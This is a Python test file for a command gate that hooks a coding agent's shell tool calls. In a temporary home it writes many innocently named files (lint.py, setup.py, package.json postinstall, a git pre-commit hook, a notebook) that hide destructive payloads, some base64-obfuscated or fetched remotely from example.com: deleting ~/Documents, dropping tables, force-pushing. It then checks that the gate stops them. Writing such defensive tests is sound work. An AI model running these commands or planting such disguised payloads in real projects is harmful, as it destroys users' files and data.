#!/usr/bin/env python3
"""Files that look harmless and are not: every way an agent can run a file, with a payload inside.
Runs the gate as a hook in enforce mode in a throwaway home. Nothing here is ever executed:
the gate only reads the files. Usage: test_files.py [gate.py] [-v]"""
import base64, json, os, shutil, subprocess, sys, tempfile

GATE = (sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else os.path.join(os.path.dirname(os.path.abspath(__file__)), "operator-gate.py"))
VERBOSE = "-v" in sys.argv
home = tempfile.mkdtemp(prefix="hidden-", dir=os.path.expanduser("~"))
work = os.path.join(home, "proj")
os.makedirs(os.path.join(home, "Documents"))
os.makedirs(os.path.join(home, ".operator"))
os.makedirs(work)
with open(os.path.join(home, ".operator", "mode"), "w") as f:
    f.write("enforce\n")
env = dict(os.environ, HOME=home, USERPROFILE=home, OPERATOR_HOME=os.path.join(home, ".operator"))
env.pop("OPERATOR_AGENT_SESSION", None)
env.pop("OPERATOR_GATE_MODE", None)


def put(rel, body, mode=None):
    p = os.path.join(work, rel)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "w") as f:
        f.write(body)
    if mode:
        os.chmod(p, mode)
    return p


def hook(cmd, tool="Bash"):
    payload = json.dumps({"tool_name": tool, "tool_input": {"command": cmd}, "cwd": work, "session_id": "t"})
    p = subprocess.run([sys.executable, GATE, "hook", "--source", "claude"], input=payload,
                       capture_output=True, text=True, env=env)
    return p.returncode, p.stderr


WIPE = "rm -rf ~/Documents"
B64 = base64.b64encode(WIPE.encode()).decode()

# ---- the files: each is named to look fine ---------------------------------------------------- #
put("no_bugs.py", 'import os\n\ndef main():\n    print("all good")\n    os.system("rm -rf ~/Documents")\n\nmain()\n')
put("health_check.py", 'import subprocess, os\nsubprocess.run(["rm", "-rf", os.path.expanduser("~/Documents")])\n')
put("format_code.py", 'import subprocess\nsubprocess.run("rm -rf ~/Documents", shell=True, check=True)\n')
put("lint.py", 'import shutil, os\nshutil.rmtree(os.path.expanduser("~/Documents"))\n')
put("tidy.py", 'import shutil\nfrom pathlib import Path\ntarget = Path.home() / "Documents"\nshutil.rmtree(target)\n')
put("report.py", 'import os, shutil\nhome = os.path.expanduser("~")\nshutil.rmtree(os.path.join(home, "Documents"), ignore_errors=True)\n')
put("update_deps.py", 'import os\nos.popen("git push --force origin main").read()\n')
put("seed.py", 'import subprocess\nsubprocess.run(["php", "artisan", "migrate:fresh", "--seed", "--force"])\n')
put("sync_schema.py", 'import os\nos.system("npx prisma migrate reset --force")\n')
put("fixtures.py", 'from django.core.management import call_command\ncall_command("flush", interactive=False)\n')
put("models_check.py", 'from myapp import db\n\ndb.drop_all()\ndb.create_all()\n')
put("migrate_helper.py", 'import sqlite3\nc = sqlite3.connect("app.db")\nc.execute("DROP TABLE users")\nc.commit()\n')
put("readme_gen.py", 'import base64, os\nos.system(base64.b64decode("%s").decode())\n' % B64)
put("docs_build.py", 'import base64\nexec(base64.b64decode("%s"))\n' % base64.b64encode(b'import os; os.system("rm -rf ~/Documents")').decode())
put("main.py", 'from helpers import cleanup\n\ncleanup.run()\n')
put("helpers/__init__.py", "")
put("helpers/cleanup.py", 'import os\n\ndef run():\n    os.system("rm -rf ~/Documents")\n')
put("app.py", 'import utils\nutils.go()\n')
put("utils.py", 'import shutil, os\n\ndef go():\n    shutil.rmtree(os.path.expanduser("~/Documents"))\n')
put("tools/cleanup.py", 'import os\nos.system("rm -rf ~/Documents")\n')
put("tools/__init__.py", "")
put("fetch.py", 'import urllib.request\nexec(urllib.request.urlopen("https://example.com/x.py").read())\n')
put("ok.py", 'import json, sys\nprint(json.dumps({"ok": True}))\n')
put("build.py", 'import shutil\nshutil.rmtree("dist", ignore_errors=True)\nshutil.rmtree("build", ignore_errors=True)\n')
put("clean_cache.py", 'import os\nos.system("rm -rf node_modules/.cache")\nos.system("git status")\n')

put("cleanup.js", "const { execSync } = require('child_process');\nexecSync('rm -rf ~/Documents');\n")
put("check.js", "const fs = require('fs'); const os = require('os');\nfs.rmSync(os.homedir() + '/Documents', { recursive: true, force: true });\n")
put("prettier-fix.js", "const cp = require('child_process');\ncp.spawnSync('rm', ['-rf', process.env.HOME + '/Documents']);\n")
put("reset.mjs", "import { PrismaClient } from '@prisma/client';\nconst p = new PrismaClient();\nawait p.user.deleteMany();\n")
put("index.js", "const { wipe } = require('./lib/store');\nwipe();\n")
put("lib/store.js", "const { execSync } = require('child_process');\nexports.wipe = () => execSync('rm -rf ~/Documents');\n")
put("typecheck.ts", "import { execSync } from 'node:child_process';\nexecSync('rm -rf ~/Documents');\n")
put("ok.js", "console.log('fine');\n")
put("fmt.rb", 'system("rm -rf ~/Documents")\n')
put("spec_helper.rb", "`rm -rf ~/Documents`\n")
put("rake_helper.rb", 'require "fileutils"\nFileUtils.rm_rf(File.expand_path("~/Documents"))\n')
put("index.php", '<?php\nshell_exec("rm -rf ~/Documents");\n')
put("artisan_helper.php", "<?php\nuse Illuminate\\Support\\Facades\\Artisan;\nArtisan::call('migrate:fresh', ['--force' => true]);\n")
put("backup.pl", 'system("rm -rf ~/Documents");\n')
put("gen.go", 'package main\n\nimport ("os"; "os/exec")\n\nfunc main() {\n\texec.Command("rm", "-rf", os.Getenv("HOME")+"/Documents").Run()\n}\n')

put("totally_harmless.sh", "#!/bin/bash\n# totally harmless cleanup\nrm -rf ~/Documents\n", 0o755)
put("run_tests.sh", "#!/bin/sh\npython3 no_bugs.py\n", 0o755)
put("ci.sh", "#!/bin/bash\nset -e\nphp artisan migrate:fresh --seed --force\n", 0o755)
put("lint", "#!/usr/bin/env python3\nimport os\nos.system('rm -rf ~/Documents')\n", 0o755)
put("ok.sh", "#!/bin/sh\necho ok\nls -la\n", 0o755)
put("wipe.sql", "-- nightly maintenance\nDROP TABLE users;\nTRUNCATE TABLE orders;\n")
put("report.sql", "SELECT count(*) FROM users;\n")
put("seed.mongo.js", "db.users.drop();\ndb.dropDatabase();\n")
put("cleanup.ps1", "Write-Host 'cleaning'\nRemove-Item -Recurse -Force $env:USERPROFILE\\Documents\n")
put("ok.ps1", "Write-Host 'fine'\n")
put("package.json", json.dumps({"name": "x", "scripts": {
    "cleanup": "rm -rf ~/Documents", "lint": "eslint .", "db:seed": "node cleanup.js",
    "pretest": "rm -rf ~/Documents", "test": "jest", "postinstall": "node check.js",
    "format": "prettier --write ."}}))
put("Makefile", "build:\n\tcargo build\n\nclean:\n\t@rm -rf ~/Documents\n\ndocs: tidy\n\techo docs\n\ntidy:\n\tpython3 no_bugs.py\n\nfmt:\n\tcargo fmt\n")
put("composer.json", json.dumps({"scripts": {"fresh": "php artisan migrate:fresh --force", "test": "phpunit"}}))
put("setup.py", 'import os\nfrom setuptools import setup\nos.system("rm -rf ~/Documents")\nsetup(name="x")\n')
put("analysis.ipynb", json.dumps({"cells": [
    {"cell_type": "markdown", "source": ["# analysis"]},
    {"cell_type": "code", "source": ["import shutil, os\n", "shutil.rmtree(os.path.expanduser('~/Documents'))\n"]},
    {"cell_type": "code", "source": ["!rm -rf ~/Documents\n"]}], "metadata": {}, "nbformat": 4, "nbformat_minor": 5}))
os.makedirs(os.path.join(work, ".git", "hooks"))
put(".git/hooks/pre-commit", "#!/bin/sh\nrm -rf ~/Documents\n", 0o755)
put(".git/hooks/pre-push.sample", "#!/bin/sh\nrm -rf ~/Documents\n", 0o755)

put("clean.sh", '#!/bin/sh\nrm -rf "$1"\n', 0o755)
put("walker.py", 'import os\nroot = os.path.expanduser("~/Documents")\nfor base, dirs, files in os.walk(root):\n    for f in files:\n        os.remove(os.path.join(base, f))\n')
put("argdel.py", 'import shutil, sys\nshutil.rmtree(sys.argv[1])\n')

STOP = [  # (what it is, command, tool)
    ("python file that shells out with os.system", "python3 no_bugs.py"),
    ("python file, subprocess with a list", "python3 health_check.py"),
    ("python file, subprocess with shell=True", "python format_code.py"),
    ("python file, shutil.rmtree of a home folder", "python3 lint.py"),
    ("python file, Path.home() / 'Documents'", "python3 tidy.py"),
    ("python file, os.path.join(home, ...)", "python3 report.py"),
    ("python file that force-pushes", "python3 update_deps.py"),
    ("python file that runs migrate:fresh", "python3 seed.py"),
    ("python file that runs prisma migrate reset", "python3 sync_schema.py"),
    ("python file, call_command('flush')", "python3 fixtures.py"),
    ("python file, db.drop_all()", "python3 models_check.py"),
    ("python file, DROP TABLE through a cursor", "python3 migrate_helper.py"),
    ("python file, base64 payload handed to os.system", "python3 readme_gen.py"),
    ("python file, exec of a base64 payload", "python3 docs_build.py"),
    ("python file whose import carries the payload (package)", "python3 main.py"),
    ("python file whose import carries the payload (module)", "python3 app.py"),
    ("python -m of a local module", "python3 -m tools.cleanup"),
    ("uv run of a python file", "uv run no_bugs.py"),
    ("poetry run python file", "poetry run python no_bugs.py"),
    ("python file from stdin redirect", "python3 < no_bugs.py"),
    ("node file, execSync", "node cleanup.js"),
    ("node file, fs.rmSync of a home folder", "node check.js"),
    ("node file, spawnSync with a list", "node prettier-fix.js"),
    ("node file, prisma deleteMany()", "node reset.mjs"),
    ("node file whose require carries the payload", "node index.js"),
    ("typescript through tsx", "npx tsx typecheck.ts"),
    ("typescript through ts-node", "ts-node typecheck.ts"),
    ("bun runs a typescript file", "bun typecheck.ts"),
    ("deno run", "deno run -A typecheck.ts"),
    ("ruby file, system()", "ruby fmt.rb"),
    ("ruby file, backticks", "ruby spec_helper.rb"),
    ("ruby file, FileUtils.rm_rf", "ruby rake_helper.rb"),
    ("php file, shell_exec", "php index.php"),
    ("php file, Artisan::call('migrate:fresh')", "php artisan_helper.php"),
    ("perl file, system()", "perl backup.pl"),
    ("go run", "go run gen.go"),
    ("shell script by bash", "bash totally_harmless.sh"),
    ("shell script run directly", "./totally_harmless.sh"),
    ("shell script that runs the python file", "bash run_tests.sh"),
    ("shell script run directly that resets the database", "./ci.sh"),
    ("extensionless script with a python shebang, run directly", "./lint"),
    ("shell script from stdin redirect", "bash < totally_harmless.sh"),
    ("chmod then run", "chmod +x totally_harmless.sh && ./totally_harmless.sh"),
    ("npm run script", "npm run cleanup"),
    ("npm script that runs a node file", "npm run db:seed"),
    ("npm test with a destructive pretest", "npm test"),
    ("npm install with a destructive postinstall", "npm install"),
    ("yarn script", "yarn cleanup"),
    ("pnpm script", "pnpm run cleanup"),
    ("bun run script", "bun run cleanup"),
    ("make target", "make clean"),
    ("make target whose prerequisite runs the file", "make docs"),
    ("composer script", "composer run fresh"),
    ("pip install of a local package with a destructive setup.py", "pip install -e ."),
    ("sql file handed to psql", "psql -f wipe.sql app"),
    ("sql file through a redirect", "psql app < wipe.sql"),
    ("sql file through sqlite3 redirect", "sqlite3 app.db < wipe.sql"),
    ("sql file through mysql redirect", "mysql app < wipe.sql"),
    ("sqlite3 .read", "sqlite3 app.db '.read wipe.sql'"),
    ("mongo script file", "mongosh mydb seed.mongo.js"),
    ("notebook executed by nbconvert", "jupyter nbconvert --to notebook --execute analysis.ipynb"),
    ("notebook executed by papermill", "papermill analysis.ipynb out.ipynb"),
    ("git commit with a destructive pre-commit hook", "git commit -m wip"),
    ("powershell script file", "pwsh cleanup.ps1"),
    ("powershell -File", "powershell -ExecutionPolicy Bypass -File cleanup.ps1"),
    ("powershell script run from the PowerShell tool", ".\\cleanup.ps1", "PowerShell"),
    ("inline python rmtree of a home folder", "python3 -c \"import shutil, os; shutil.rmtree(os.path.expanduser('~/Documents'))\""),
    ("inline python os.system", "python3 -c \"import os; os.system('rm -rf ~/Documents')\""),
    ("inline node execSync", "node -e \"require('child_process').execSync('rm -rf ~/Documents')\""),
    ("heredoc python", "python3 - <<'EOF'\nimport os\nos.system('rm -rf ~/Documents')\nEOF"),
    ("osascript do shell script", "osascript -e 'do shell script \"rm -rf ~/Documents\"'"),
    ("shell script handed the folder as its argument", "bash clean.sh ~/Documents"),
    ("the same script run directly with the argument", "./clean.sh ~/Documents"),
    ("python file that walks a folder and removes each file", "python3 walker.py"),
    ("python file handed the folder as its argument", "python3 argdel.py ~/Documents"),
    ("a function defined and called", "f() { rm -rf ~/Documents; }; f"),
    ("text piped into a shell", "echo 'rm -rf ~/Documents' | bash"),
    ("a file piped into a shell", "cat totally_harmless.sh | bash"),
    ("a here-string handed to a shell", "bash <<< 'rm -rf ~/Documents'"),
    ("a file piped into python", "cat no_bugs.py | python3"),
    ("shell file written and run in one command", "echo 'rm -rf ~/Documents' > y.sh && bash y.sh"),
    ("shell file written with printf, then run", "printf 'rm -rf ~/Documents\\n' > y.sh; sh y.sh"),
    ("shell file written from a heredoc, then run", "cat > y.sh <<'EOF'\nrm -rf ~/Documents\nEOF\nbash y.sh"),
    ("python file written from a heredoc, then run",
     "cat > y.py <<'EOF'\nimport shutil, os\nshutil.rmtree(os.path.expanduser('~/Documents'))\nEOF\npython3 y.py"),
]
ALLOW = [
    ("a python file that only prints", "python3 ok.py"),
    ("a build script that clears dist and build", "python3 build.py"),
    ("a python file that shells out to harmless commands", "python3 clean_cache.py"),
    ("a node file that only prints", "node ok.js"),
    ("a shell script that lists files", "bash ok.sh"),
    ("the same script run directly", "./ok.sh"),
    ("npm lint script", "npm run lint"),
    ("npm format script", "npm run format"),
    ("make build", "make build"),
    ("make fmt", "make fmt"),
    ("composer test script", "composer run test"),
    ("a select-only sql file", "psql -f report.sql app"),
    ("a harmless powershell script", "pwsh ok.ps1"),
    ("reading the payload file is not running it", "cat no_bugs.py"),
    ("searching the payload file", "grep -n system no_bugs.py"),
    ("linting the payload file", "ruff check no_bugs.py"),
    ("adding the payload file to git", "git add no_bugs.py"),
    ("counting its lines", "wc -l no_bugs.py totally_harmless.sh"),
    ("compiling it without running", "python3 -m py_compile no_bugs.py"),
    ("git push runs no pre-push hook here (only a .sample exists)", "git push --dry-run"),
    ("git status with a destructive pre-commit hook present", "git status"),
    ("a harmless python file written from a heredoc, then run", "cat > y.py <<'EOF'\nprint('hello')\nEOF\npython3 y.py"),
    ("a harmless shell file written and run", "echo 'echo hi' > y.sh && bash y.sh"),
    ("the argument script handed a build folder", "bash clean.sh node_modules"),
    ("a harmless function defined and called", "f() { echo hi; }; f"),
    ("harmless text piped into a shell", "echo 'ls -la' | bash"),
]

bad = 0
for case in STOP:
    name, cmd = case[0], case[1]
    tool = case[2] if len(case) > 2 else "Bash"
    rc, err = hook(cmd, tool)
    ok = rc == 2 and "OPERATOR: STOPPED" in err
    bad += not ok
    if VERBOSE or not ok:
        print("%s stop   %-58s %s" % ("ok " if ok else "MISS", name[:58], (err.strip().splitlines() or ["(exit %d, silent)" % rc])[0][:70]))
for name, cmd in ALLOW:
    rc, err = hook(cmd)
    ok = rc == 0
    bad += not ok
    if VERBOSE or not ok:
        print("%s allow  %-58s %s" % ("ok " if ok else "FALSE", name[:58], (err.strip().splitlines() or [""])[0][:70]))
print("hidden-file cases: %d must stop, %d must pass, wrong: %d" % (len(STOP), len(ALLOW), bad))
shutil.rmtree(home, ignore_errors=True)
sys.exit(1 if bad else 0)
